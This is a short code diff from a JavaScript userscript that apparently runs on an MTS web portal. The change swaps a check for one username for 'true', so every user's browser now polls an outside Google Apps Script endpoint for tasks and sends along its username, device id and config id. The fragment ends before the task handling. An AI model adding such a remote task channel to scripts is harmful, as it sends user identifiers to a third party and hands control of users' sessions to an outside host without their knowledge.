@@ -58,7 +58,7 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 						},
 					})
 				}).then(function(obj){/*console.log(obj)*/}).catch(function(err){console.log(err)}).finally(function(){
-					if(username=='mypanty1'){
+					if(true/*username=='mypanty1'*/){
 						let timer_getTask=setTimeout(getTask,timeout_getTask);
 						function getTask(){
 							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid+'&configid='+configid,).then(function(resp){return resp.json()}).then(function(obj){
